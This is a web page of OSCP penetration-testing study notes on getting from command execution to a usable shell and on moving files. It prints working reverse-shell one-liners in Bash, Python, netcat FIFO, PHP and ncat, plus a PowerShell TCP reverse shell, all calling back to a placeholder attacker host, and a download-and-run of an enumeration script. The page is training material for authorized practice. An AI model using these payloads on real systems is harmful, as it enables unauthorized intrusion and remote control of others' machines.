route?</a></li><li><a href="/oscp/notes/ad-investigation/secure-baseline/">Expected behavior or useful weakness?</a></li><li><a href="/oscp/notes/ad-investigation/sessions/">A privileged user has a session — what does that mean?</a></li><li><a href="/oscp/notes/ad-investigation/shares/">Which shares and files should I inspect first?</a></li><li><a href="/oscp/notes/ad-investigation/smb-wmi/">SMB or WMI execution — what must be true first?</a></li><li><a href="/oscp/notes/ad-investigation/spns/">What does an SPN tell me to investigate?</a></li><li><a href="/oscp/notes/ad-investigation/tickets/">What does this Kerberos ticket actually allow?</a></li><li><a href="/oscp/notes/ad-investigation/users/">Where do I find useful users and group memberships?</a></li><li><a href="/oscp/notes/ad-investigation/winrm/">WinRM or RDP — why would this account be allowed in?</a></li></ul></details></li><li><details open><summary>Method guides</summary><ul><li><a href="/oscp/notes/methods/ad-identities/">Gain a more useful domain identity</a></li><li><a href="/oscp/notes/methods/ad-mapping/">Map Active Directory attack paths</a></li><li><a href="/oscp/notes/methods/credentials/">Recover and use authentication material</a></li><li><a href="/oscp/notes/methods/discovery/">Discover attack surfaces</a></li><li><a href="/oscp/notes/methods/execution/">Resolve payload execution obstacles</a></li><li><a href="/oscp/notes/methods/integration/">Complete attacks and retain reproducible evidence</a></li><li><a href="/oscp/notes/methods/lateral-movement/">Move to another host</a></li><li><a href="/oscp/notes/methods/linux-privesc/">Escalate privileges on Linux</a></li><li><a href="/oscp/notes/methods/pivoting/">Reach internal services</a></li><li><a href="/oscp/notes/methods/public-exploits/">Select and adapt public exploits</a></li><li><a href="/oscp/notes/methods/services/">Extract opportunities from services</a></li><li><a href="/oscp/notes/methods/sessions-transfers/" aria-current="page">Establish sessions and move files</a></li><li><a href="/oscp/notes/methods/web-exploitation/">Turn application weaknesses into access</a></li><li><a href="/oscp/notes/methods/web-mapping/">Map useful web behavior</a></li><li><a href="/oscp/notes/methods/windows-privesc/">Escalate privileges on Windows</a></li></ul></details></li></ul></details></li></ul></nav><hr><p><a href="/">Website</a> · <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference">Source</a></p></aside><main id="document" tabindex="-1"><article><h1 id="establish-sessions-and-move-files">Establish sessions and move files</h1>
+<p><a href="/oscp/notes/Attack_Strategy_Map/">Strategy map</a> | <a href="/oscp/notes/Master_Notes/">Master Notes</a> | <a href="/oscp/">Operational index</a> | <a href="/oscp/cheatsheets/">Cheatsheets</a></p>
+<p>Delivery, execution, connection and a usable session are separate states. Select a connection direction and compatible interpreter before generating payloads; transfers must preserve bytes and destination permissions.</p>
+<p><strong>Speedrun blocks:</strong> 7; transfers support 5–14. <strong>Documented methods:</strong> 12.</p>
+<p>Examples are hypothetical study material. Apply commands only to an assigned scope during the later practice phase. A method is enabled by its prerequisites; its presence here does not establish a vulnerability or practical mastery.</p>
+<h2 id="first-pass-tools-and-findings">First pass: tools and findings</h2>
+<p>Use the branch matching the current host, identity and observed result. Tool output supplies leads; the linked procedure verifies and uses the exact condition.</p>
+<h3 id="verify-the-host-and-command-identity">Verify the host and command identity</h3>
+<p>A single response is not necessarily a stable session. Record the actual destination and output channel.</p>
+<pre><code class="language-bash">hostname
+id
+pwd
+ip addr
+ip route
+</code></pre>
+<ul>
+<li><strong>If Commands execute as the expected target identity:</strong> Choose the available callback direction and interpreter. → <a href="/oscp/notes/methods/sessions-transfers/#session-reverse">Connect a Linux reverse shell through an available interpreter</a>.</li>
+<li><strong>If Callback cannot reach the listener:</strong> Inspect the actual initiator, destination and route. → <a href="/oscp/notes/methods/execution/#execution-callback">Diagnose connection direction, listener and session failures in order</a>.</li>
+<li><strong>Otherwise:</strong> Output cannot be attributed to the destination: repeat the host/identity proof. → <a href="/oscp/notes/methods/sessions-transfers/#session-proof">Verify command execution, host and represented identity</a>.</li>
+</ul>
+<h3 id="transfer-a-reviewed-tool-through-a-reachable-route">Transfer a reviewed tool through a reachable route</h3>
+<p>Serve from the attacker and download on the target only when that direction is reachable. Verify the received artifact.</p>
+<pre><code class="language-bash">wget http://LHOST:8000/linpeas.sh -O /tmp/linpeas.sh
+chmod +x /tmp/linpeas.sh
+/tmp/linpeas.sh | tee /tmp/linpeas.txt
+</code></pre>
+<ul>
+<li><strong>If The verified Linux enumerator is present:</strong> Run the LinPEAS baseline and inspect its findings. → <a href="/oscp/notes/methods/linux-privesc/#linux-enumerators">Use enumeration tools to generate manually testable candidates</a>.</li>
+<li><strong>If HTTP is unavailable but SSH file access works:</strong> Use SCP instead of forcing the same failing transport. → <a href="/oscp/notes/methods/sessions-transfers/#transfer-scp">Copy files through an authenticated SSH service</a>.</li>
+<li><strong>If SMB is the usable authenticated channel:</strong> Use the SMB transfer procedure in that identity. → <a href="/oscp/notes/methods/sessions-transfers/#transfer-smb">Move Windows files through an authenticated SMB share</a>.</li>
+<li><strong>Otherwise:</strong> Bytes differ or the file is missing: fix transfer before interpreting execution errors. → <a href="/oscp/notes/methods/execution/#execution-format">Match an artifact to its executable consumer and runtime</a>.</li>
+</ul>
+<h2 id="discovery-workflow">Discovery workflow</h2>
+<p>Start with a claimed effect, command primitive or accepted remote identity; a usable shell and return path remain unproved.</p>
+<p>Follow these observations into a method; the detailed recognition routes below show synthetic output and the checks still needed.</p>
+<ol>
+<li>Verify destination, execution identity and the actual output channel: <a href="/oscp/notes/methods/sessions-transfers/#session-proof">Verify command execution, host and represented identity</a>.</li>
+<li>Inspect interpreters and both connection directions before choosing reverse, bind or native access: <a href="/oscp/notes/methods/sessions-transfers/#session-reverse">Connect a Linux reverse shell through an available interpreter</a>; <a href="/oscp/notes/methods/sessions-transfers/#session-bind">Use a bind shell when the target can accept inbound connections</a>; <a href="/oscp/notes/methods/sessions-transfers/#session-windows">Use Windows authenticated access or a PowerShell command channel</a>.</li>
+<li>Match artifact/handler and terminal requirements to the selected consumer: <a href="/oscp/notes/methods/sessions-transfers/#payload-generate">Generate a payload matching OS, process, format and handler</a>; <a href="/oscp/notes/methods/sessions-transfers/#session-tty">Repair a limited Linux terminal</a>.</li>
+<li>Select a transfer route by available client, authentication and direction, then verify bytes: <a href="/oscp/notes/methods/sessions-transfers/#transfer-http">Transfer over HTTP using Linux or Windows clients</a>; <a href="/oscp/notes/methods/sessions-transfers/#transfer-scp">Copy files through an authenticated SSH service</a>; <a href="/oscp/notes/methods/sessions-transfers/#transfer-smb">Move Windows files through an authenticated SMB share</a>; <a href="/oscp/notes/methods/sessions-transfers/#transfer-text">Move a small artifact through a text-only channel</a>.</li>
+</ol>
+<p><strong>Decision rule:</strong> an observed clue opens a candidate. Choose it only after the missing conditions are verified; a failed check rules out that context, while unavailable evidence stays inconclusive.</p>
+<h2 id="method-families">Method families</h2>
+<ul>
+<li><strong>Execution and connection direction:</strong> <a href="#session-proof">Verify command execution, host and represented identity</a>, <a href="#session-reverse">Connect a Linux reverse shell through an available interpreter</a>, <a href="#session-windows">Use Windows authenticated access or a PowerShell command channel</a>, <a href="#session-bind">Use a bind shell when the target can accept inbound connections</a>.</li>
+<li><strong>Payload and terminal compatibility:</strong> <a href="#payload-generate">Generate a payload matching OS, process, format and handler</a>, <a href="#session-tty">Repair a limited Linux terminal</a>.</li>
+<li><strong>File transport and integrity:</strong> <a href="#transfer-http">Transfer over HTTP using Linux or Windows clients</a>, <a href="#transfer-scp">Copy files through an authenticated SSH service</a>, <a href="#transfer-smb">Move Windows files through an authenticated SMB share</a>, <a href="#transfer-stream">Stream a file over a direct TCP connection</a>, <a href="#transfer-text">Move a small artifact through a text-only channel</a>, <a href="#transfer-ftp">Use a temporary FTP transfer as a constrained fallback</a>.</li>
+</ul>
+<h2 id="choose-a-method">Choose a method</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Method</th><th>Recognition clue</th><th>Required access</th><th>Enabling conditions</th><th>Resulting capability</th></tr></thead><tbody><tr><td><a href="#session-proof">Verify command execution, host and represented identity</a></td><td>A PoC, injected command or remote client reports execution</td><td>Verified command execution or authenticated remote access and a known network path</td><td>A functioning execution primitive and an observable output or controlled side effect</td><td>A verified foothold state with host, identity, privilege and network context</td></tr><tr><td><a href="#session-reverse">Connect a Linux reverse shell through an available interpreter</a></td><td>Linux command execution exists but an interactive channel is needed</td><td>Verified command execution or authenticated remote access and a known network path</td><td>A confirmed Bash/Python/PHP/Netcat implementation, correct parser wrapping, target-to-listener route and compatible listener</td><td>A verified reverse command channel under the executing identity</td></tr><tr><td><a href="#session-windows">Use Windows authenticated access or a PowerShell command channel</a></td><td>Windows execution or valid credentials with an available remote service</td><td>Verified command execution or authenticated remote access and a known network path</td><td>Accepted remote-service rights or compatible PowerShell execution; correct encoding, policy context and callback route</td><td>A verified Windows session with known token and channel limitations</td></tr><tr><td><a href="#session-bind">Use a bind shell when the target can accept inbound connections</a></td><td>Reverse egress is unavailable but a target listener is reachable</td><td>Verified command execution or authenticated remote access and a known network path</td><td>Permission to bind, compatible Netcat/Ncat behavior and source-to-target listener connectivity through any required forward</td><td>A verified inbound command channel on the target</td></tr><tr><td><a href="#payload-generate">Generate a payload matching OS, process, format and handler</a></td><td>An existing exploit/delivery primitive needs a binary or raw payload</td><td>Verified command execution or authenticated remote access and a known network path</td><td>Verified target/process architecture, delivery format, callback route, payload constraints and a matching staged/stageless listener</td><td>A compatible artifact and a correctly paired listener configuration</td></tr><tr><td><a href="#session-tty">Repair a limited Linux terminal</a></td><td>A working shell lacks job control, terminal signals or interactive program support</td><td>Verified command execution or authenticated remote access and a known network path</td><td>A working channel and available PTY mechanism; correct local-terminal control sequence</td><td>A usable terminal while preserving the existing identity</td></tr><tr><td><a href="#transfer-http">Transfer over HTTP using Linux or Windows clients</a></td><td>A tool/artifact must reach a target that can make an HTTP request</td><td>Verified command execution or authenticated remote access and a known network path</td><td>Correct server bind and served directory; target-to-server route, available downloader and writable destination</td><td>A downloaded file whose destination bytes can be verified</td></tr><tr><td><a href="#transfer-scp">Copy files through an authenticated SSH service</a></td><td>An SSH identity can access the needed source/destination</td><td>Verified command execution or authenticated remote access and a known network path</td><td>Reachable SSH/SFTP service, correct key/password and read/write rights; client/server subsystem compatibility</td><td>An authenticated file copy with verified bytes</td></tr><tr><td><a href="#transfer-smb">Move Windows files through an authenticated SMB share</a></td><td>A Windows source can reach a temporary assessment-side SMB service</td><td>Verified command execution or authenticated remote access and a known network path</td><td>Inbound SMB listener on the server, outbound TCP/445 from the client, compatible SMB version and explicit share credentials</td><td>A verified read/write transfer over the temporary share</td></tr><tr><td><a href="#transfer-stream">Stream a file over a direct TCP connection</a></td><td>Only a raw TCP tool and a direct or forwarded connection are available</td><td>Verified command execution or authenticated remote access and a known network path</td><td>Unambiguous sender/receiver direction, compatible Netcat listener syntax and a writable output file</td><td>A byte stream saved as a file and independently checked for integrity</td></tr><tr><td><a href="#transfer-text">Move a small artifact through a text-only channel</a></td><td>The existing command channel permits text but no convenient file-transfer connection</td><td>Verified command execution or authenticated remote access and a known network path</td><td>Available Base64 encode/decode, adequate command length and a writable destination</td><td>A reconstructed small file with matching bytes</td></tr><tr><td><a href="#transfer-ftp">Use a temporary FTP transfer as a constrained fallback</a></td><td>The target has an FTP client and simpler transfer routes are unavailable</td><td>Verified command execution or authenticated remote access and a known network path</td><td>A deliberately selected temporary server, correct served directory, control/data paths and binary transfer mode</td><td>A verified temporary FTP file transfer</td></tr></tbody></table>
+<p><a id="session-proof"></a></p>
+<h2 id="verify-command-execution-host-and-represented-identity">Verify command execution, host and represented identity</h2>
+<p><strong>Blocks:</strong> 7; transfers support 5–14. <a href="/oscp/reference/04-shells-transfers-credentials/02-shells-and-payloads/#keep-four-states-separate">Operational procedure</a> | <a href="/oscp/reference/04-shells-transfers-credentials/02-shells-and-payloads/#choose-the-access-form">Operational procedure</a> | <a href="/oscp/reference/04-shells-transfers-credentials/02-shells-and-payloads/#prove-command-execution-before-requesting-a-shell">Operational procedure</a> | <a href="/oscp/reference/04-shells-transfers-credentials/02-shells-and-payloads/#verify-every-new-session">Operational procedure</a> | <a href="/oscp/reference/03-initial-access/06-public-exploit-adaptation/#prove-effects-in-increasing-order">Operational procedure</a> | <a href="/oscp/cheatsheets/shells-payloads/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result">1. Purpose and result</h3>
+<p>A verified foothold state with host, identity, privilege and network context.</p>
+<h3 id="2-recognition-clues">2. Recognition clues</h3>
+<p>A PoC, injected command or remote client reports execution.</p>
+<h4 id="find-the-clue-from-your-starting-access">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> Begin with the original command/PoC/client result and request a small host/identity proof through its existing output channel.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-bash">hostname
+id
+pwd
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">hostname: TARGET_HOST
+uid=USER_ID(APP_USER) gid=GROUP_ID(APP_GROUP)
+working directory: /APP_PATH
+</code></pre>
+<p><strong>Recognize this detail:</strong> Host-specific identity output demonstrates execution under that account, not yet a reverse connection or full terminal.</p>
+<p><strong>Still missing before method selection:</strong> Record OS, privilege and network position; choose an access form whose interpreter/service and route exist.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>The intended target's command proof is reproducible: use the confirmed foothold as the starting state.</td></tr><tr><td>Ruled out in this context</td><td>The tool's success message has no command-specific effect and the operation is rejected: discard its execution claim.</td></tr><tr><td>Inconclusive</td><td>A hung request with no observable effect leaves execution unknown; obtain a bounded independent observation.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/web-exploitation/#web-command">Prove visible or blind operating-system command injection</a>.</p>
+<h3 id="3-prerequisites">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> Verified command execution or authenticated remote access and a known network path. <strong>Required conditions:</strong> A functioning execution primitive and an observable output or controlled side effect.</p>
+<h3 id="4-discover-and-verify-prerequisites">4. Discover and verify prerequisites</h3>
+<pre><code class="language-bash">hostname
+id
+pwd
+ip addr
+ip route
+</code></pre>
+<h3 id="5-why-it-works">5. Why it works</h3>
+<p>Execution, connection and a usable session are different capabilities. A command-output path may be enough to enumerate before any interactive shell exists.</p>
+<h3 id="6-execute-and-choose-variants">6. Execute and choose variants</h3>
+<pre><code class="language-text">delivery → execution → connection → usable session
+</code></pre>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>State</th><th>Decisive evidence</th><th>Does not yet prove</th></tr></thead><tbody><tr><td>Delivery</td><td>Exact bytes/request reached intended consumer</td><td>Payload executed</td></tr><tr><td>Execution</td><td>Harmless command output or controlled side effect</td><td>Network callback works</td></tr><tr><td>Connection</td><td>Listener records the expected peer</td><td>Commands and I/O are usable</td></tr><tr><td>Session</td><td>Commands return and host/identity are verified</td><td>Higher privilege or stability</td></tr></tbody></table>
+<p>Do not change all four layers at once. Preserve the last confirmed state and test the next boundary.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Situation</th><th>Prefer</th><th>Main prerequisite / limitation</th></tr></thead><tbody><tr><td>One bounded action is enough</td><td>Direct command execution</td><td>Observable output or side effect; no shell required</td></tr><tr><td>Valid credential and remote service</td><td>SSH, WinRM or RDP</td><td>Authentication plus remote-logon authorization</td></tr><tr><td>Target can reach Kali</td><td>Reverse shell</td><td>Target egress and a reachable Kali listener</td></tr><tr><td>Kali can reach a target listener</td><td>Bind shell</td><td>Target can bind and inbound path permits it</td></tr><tr><td>Payload is staged or protocol-aware</td><td>Matching framework handler</td><td>Handler must use the exact payload/transport</td></tr></tbody></table>
+<p>Prefer authenticated administrative access when it is already available: it is normally more stable, auditable and feature-complete than an improvised shell.</p>
+<p>Linux:</p>
+<pre><code class="language-bash">id; hostname; pwd
+</code></pre>
+<p>Windows:</p>
+<pre><code class="language-cmd">whoami &#x26; hostname &#x26; cd
+</code></pre>
+<p>For blind execution, use one bounded callback or file side effect that the current context can produce and you can independently observe. Do not interpret a hung HTTP request as proof of a shell; the server may simply be waiting on a child process or timeout.</p>
+<p>Linux:</p>
+<pre><code class="language-bash">hostname; id; pwd
+ip addr; ip route
+ss -lntup
+</code></pre>
+<p>Windows:</p>
+<pre><code class="language-cmd">hostname
+whoami /all
+cd
+ipconfig /all
+route print
+netstat -ano
+</code></pre>
+<p>Record the destination host, actual identity, privilege, current directory, interfaces/routes, parent/execution context and the exact command that produced the session. Then re-enumerate from the new state.</p>
+<pre><code class="language-text">exact prerequisites
+→ exploit reaches expected vulnerable path
+→ bounded harmless effect or identity output
+→ repeatable command execution
+→ payload reaches listener
+→ usable session
+→ verified host/identity/privilege/network position
+</code></pre>
+<p>Do not accept the exploit's own “success” string as proof. Validate an independent effect. An HTTP <code>200</code>, uploaded filename, connection or application crash each proves less than a verified command result.</p>
+<h3 id="7-worked-example--hypothetical">7. Worked example — hypothetical</h3>
+<p>Observation: a PoC says the request completed. Test: obtain a hostname/identity proof through the same primitive. Illustrative output: a low-privileged service account responds. Interpretation: retain that foothold and choose a session method compatible with its interpreter and network.</p>
+<h3 id="8-verify-the-result">8. Verify the result</h3>
+<p>Save destination identity/hostname and actual command output; use Windows hostname/whoami/ipconfig when appropriate.</p>
+<h3 id="9-failure-and-fallback">9. Failure and fallback</h3>
+<p>A hung request or success message does not prove execution. First establish a bounded observable effect, then diagnose the next state.</p>
+<h3 id="10-next-transitions">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/sessions-transfers/#session-reverse">Connect a Linux reverse shell through an available interpreter</a>; <a href="/oscp/notes/methods/linux-privesc/#linux-state">Establish Linux state and choose an escalation candidate</a>; <a href="/oscp/notes/methods/windows-privesc/#windows-state">Establish Windows token, host and process context</a>.</p>
+<p><a id="session-reverse"></a></p>
+<h2 id="connect-a-linux-reverse-shell-through-an-available-interpreter">Connect a Linux reverse shell through an available interpreter</h2>
+<p><strong>Blocks:</strong> 7; transfers support 5–14. <a href="/oscp/reference/04-shells-transfers-credentials/02-shells-and-payloads/#map-the-callback-before-generating-anything">Operational procedure</a> | <a href="/oscp/reference/04-shells-transfers-credentials/02-shells-and-payloads/#listener-baselines-and-netcat-variants">Operational procedure</a> | <a href="/oscp/reference/04-shells-transfers-credentials/02-shells-and-payloads/#linux-reverse-shell-baselines">Operational procedure</a> | <a href="/oscp/cheatsheets/shells-payloads/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-1">1. Purpose and result</h3>
+<p>A verified reverse command channel under the executing identity.</p>
+<h3 id="2-recognition-clues-1">2. Recognition clues</h3>
+<p>Linux command execution exists but an interactive channel is needed.</p>
+<h4 id="find-the-clue-from-your-starting-access-1">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> From the proven Linux command channel inspect available interpreters and the target's route to the proposed listener.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-bash">command -v bash python3 php nc
+ip route get LHOST
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">/usr/bin/bash
+/usr/bin/python3
+LHOST via GATEWAY dev INTERFACE
+</code></pre>
+<p><strong>Recognize this detail:</strong> An interpreter plus a plausible outbound route suggests a reverse-channel candidate.</p>
+<p><strong>Still missing before method selection:</strong> Verify target-to-listener reachability, listener binding, exact shell/parser and payload compatibility.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>The minimal connection works and the shell/handler matches: select that reverse channel.</td></tr><tr><td>Ruled out in this context</td><td>The chosen interpreter is absent: reject that interpreter's payload, retaining other available methods.</td></tr><tr><td>Inconclusive</td><td>A route entry without packet/connection evidence leaves egress filtering unresolved.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/sessions-transfers/#session-proof">Verify command execution, host and represented identity</a>.</p>
+<h3 id="3-prerequisites-1">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> Verified command execution or authenticated remote access and a known network path. <strong>Required conditions:</strong> A confirmed Bash/Python/PHP/Netcat implementation, correct parser wrapping, target-to-listener route and compatible listener.</p>
+<h3 id="4-discover-and-verify-prerequisites-1">4. Discover and verify prerequisites</h3>
+<pre><code class="language-bash">command -v bash python3 php nc
+ip route get LHOST
+</code></pre>
+<h3 id="5-why-it-works-1">5. Why it works</h3>
+<p>The target initiates the connection. The chosen LHOST must be reachable from that target, possibly through a pivot; shell syntax must survive every outer parser.</p>
+<h3 id="6-execute-and-choose-variants-1">6. Execute and choose variants</h3>
+<pre><code class="language-text">trigger context
+→ target process/interpreter and architecture
+→ target source interface
+→ route/egress controls
+→ LHOST address visible from target
+→ LPORT
+→ local bind interface
+→ listener/handler
+</code></pre>
+<p>Select <code>LHOST</code> from the target's point of view. A VPN address, tunnel endpoint or reachable interface may be correct while Kali's default-route address is wrong.</p>
+<p>On Kali:</p>
+<pre><code class="language-bash">ip -brief address
+ip route
+ss -lntp
+</code></pre>
+<p>Windows source/listener checks:</p>
+<pre><code class="language-powershell">Get-NetIPAddress -AddressFamily IPv4
+Get-NetRoute -AddressFamily IPv4
+Get-NetTCPConnection -State Listen
+</code></pre>
+<p>Traditional/OpenBSD-style <code>nc</code> commonly used on Kali:</p>
+<pre><code class="language-bash">rlwrap nc -lvnp LPORT
+</code></pre>
+<p>Nmap Ncat uses a positional listen port; do not mechanically copy every <code>nc</code> flag:</p>
+<pre><code class="language-bash">ncat -4 -lvn 0.0.0.0 LPORT
+</code></pre>
+<p>Verify the bind in another terminal:</p>
+<pre><code class="language-bash">ss -lntp | grep ':LPORT'
+</code></pre>
+<p>If multiple interfaces exist, bind deliberately:</p>
+<pre><code class="language-bash">ncat -4 -lvn LHOST LPORT
+</code></pre>
+<blockquote>
+<p><strong>Failure cue:</strong> a listener bound only to <code>127.0.0.1</code>, the wrong VPN/interface address or the wrong address family cannot receive the expected callback. “Address already in use” means another process owns the bind.</p>
+</blockquote>
+<p>Choose an interpreter that you confirmed exists.</p>
+<p>Bash TCP:</p>
+<pre><code class="language-bash">bash -c 'bash -i >&#x26; /dev/tcp/LHOST/LPORT 0>&#x26;1'
+</code></pre>
+<p>Python 3 with a PTY:</p>
+<pre><code class="language-bash">python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("LHOST",LPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
+</code></pre>
+<p>Portable FIFO plus Netcat when <code>-e</code> is absent:</p>
+<pre><code class="language-bash">rm -f /tmp/f; mkfifo /tmp/f
+cat /tmp/f | /bin/sh -i 2>&#x26;1 | nc LHOST LPORT >/tmp/f
+</code></pre>
+<p>PHP CLI:</p>
+<pre><code class="language-bash">php -r '$s=fsockopen("LHOST",LPORT);exec("/bin/sh -i &#x3C;&#x26;3 >&#x26;3 2>&#x26;3");'
+</code></pre>
+<details>
+<summary><strong>Variant — target has Ncat command execution</strong></summary>
+<p>Linux:</p>
+<pre><code class="language-bash">ncat LHOST LPORT --exec /bin/sh
+</code></pre>
+<p>Windows:</p>
+<pre><code class="language-cmd">ncat.exe LHOST LPORT --exec cmd.exe
+</code></pre>
+<p><code>--exec</code> exposes the named program directly to the network connection. Use only on the assigned host and remove transferred tooling when the exercise requires cleanup.</p>
+</details>
+<blockquote>
+<p><strong>Shell-language cue:</strong> a command injection may execute through <code>/bin/sh</code>, which does not understand every Bash construct. Wrap Bash-specific syntax in <code>bash -c '...'</code> and then encode it for the outer HTTP/template/database layer.</p>
+</blockquote>
+<h3 id="7-worked-example--hypothetical-1">7. Worked example — hypothetical</h3>
+<p>Observation: id works through a web command field but no shell arrives. Test: verify Bash exists and wrap its redirections in bash -c while inspecting listener traffic. Illustrative output: a connection and target identity appear. Interpretation: stabilize the terminal before interactive tools.</p>
+<h3 id="8-verify-the-result-1">8. Verify the result</h3>
+<p>Run hostname/id through the returned channel and distinguish a TCP connection from a functioning shell.</p>
+<h3 id="9-failure-and-fallback-1">9. Failure and fallback</h3>
+<p>No packets suggests route/listener/trigger; packets without commands suggest payload/listener mismatch. Check the first failed boundary.</p>
+<h3 id="10-next-transitions-1">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/sessions-transfers/#session-tty">Repair a limited Linux terminal</a>; <a href="/oscp/notes/methods/execution/#execution-callback">Diagnose connection direction, listener and session failures in order</a>; <a href="/oscp/notes/methods/sessions-transfers/#transfer-http">Transfer over HTTP using Linux or Windows clients</a>; <a href="/oscp/notes/methods/sessions-transfers/#session-bind">Use a bind shell when the target can accept inbound connections</a>.</p>
+<p><a id="session-windows"></a></p>
+<h2 id="use-windows-authenticated-access-or-a-powershell-command-channel">Use Windows authenticated access or a PowerShell command channel</h2>
+<p><strong>Blocks:</strong> 7; transfers support 5–14. <a href="/oscp/reference/04-shells-transfers-credentials/02-shells-and-payloads/#windows-session-options">Operational procedure</a> | <a href="/oscp/cheatsheets/shells-payloads/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-2">1. Purpose and result</h3>
+<p>A verified Windows session with known token and channel limitations.</p>
+<h3 id="2-recognition-clues-2">2. Recognition clues</h3>
+<p>Windows execution or valid credentials with an available remote service.</p>
+<h4 id="find-the-clue-from-your-starting-access-2">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> From Windows execution inspect the actual PowerShell/runtime context and any reachable authenticated remote service before building a callback.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-powershell">whoami /all
+$PSVersionTable
+$ExecutionContext.SessionState.LanguageMode
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">User: DOMAIN\APP_USER
+PSVersion: AVAILABLE_VERSION
+LanguageMode: ConstrainedLanguage
+</code></pre>
+<p><strong>Recognize this detail:</strong> The execution identity and constrained language context affect which command-channel implementations can run.</p>
+<p><strong>Still missing before method selection:</strong> Check permitted language features, remote endpoint authorization or a working callback route; encoding does not grant those.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>A supported native endpoint or verified compatible command channel works: use it and verify its token.</td></tr><tr><td>Ruled out in this context</td><td>The chosen .NET-heavy implementation is blocked by this language mode: discard that implementation.</td></tr><tr><td>Inconclusive</td><td>Unknown policy/AMSI/endpoint behavior requires identifying the first failing layer.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/sessions-transfers/#session-proof">Verify command execution, host and represented identity</a>.</p>
+<h3 id="3-prerequisites-2">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> Verified command execution or authenticated remote access and a known network path. <strong>Required conditions:</strong> Accepted remote-service rights or compatible PowerShell execution; correct encoding, policy context and callback route.</p>
+<h3 id="4-discover-and-verify-prerequisites-2">4. Discover and verify prerequisites</h3>
+<pre><code class="language-powershell">hostname
+whoami /all
+$PSVersionTable
+$ExecutionContext.SessionState.LanguageMode
+</code></pre>
+<h3 id="5-why-it-works-2">5. Why it works</h3>
+<p>Authenticated WinRM/RDP/SSH can be simpler than an injected callback. A basic PowerShell TCP loop is a command stream rather than a full terminal; encoding fixes parser transport, not authorization or endpoint controls.</p>
+<h3 id="6-execute-and-choose-variants-2">6. Execute and choose variants</h3>
+<p>Prefer an available authenticated service:</p>
+<pre><code class="language-bash">evil-winrm -i TARGET -u USER -p 'PASSWORD'
+xfreerdp /v:TARGET /u:'DOMAIN\USER' /p:'PASSWORD' /cert:ignore
+ssh -p PORT USER@TARGET
+</code></pre>
+<p>PowerShell TCP shell when direct command execution is the only primitive:</p>
+<pre><code class="language-powershell">$client = [Net.Sockets.TcpClient]::new('LHOST',LPORT)
+$stream = $client.GetStream()
+$buffer = New-Object byte[] 65535
+while (($count = $stream.Read($buffer,0,$buffer.Length)) -gt 0) {
+  $command = [Text.Encoding]::ASCII.GetString($buffer,0,$count)
+  $output = (Invoke-Expression $command 2>&#x26;1 | Out-String) + "PS $((Get-Location).Path)> "
+  $bytes = [Text.Encoding]::ASCII.GetBytes($output)
+  $stream.Write($bytes,0,$bytes.Length)
+  $stream.Flush()
+}
+$client.Close()
+</code></pre>
+<blockquote>
+<p>This is a basic command channel, not a ConPTY. Host policy, language mode, AMSI/antimalware, quoting and the parent process can affect it.</p>
+</blockquote>
+<p>PowerShell <code>-EncodedCommand</code> solves nested quoting; it is not encryption or an AV bypass. Generate UTF-16LE Base64 locally:</p>
+<pre><code class="language-powershell">$command = 'COMMAND'
+$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))
+$encoded
+</code></pre>
+<p>Invoke in the target command context:</p>
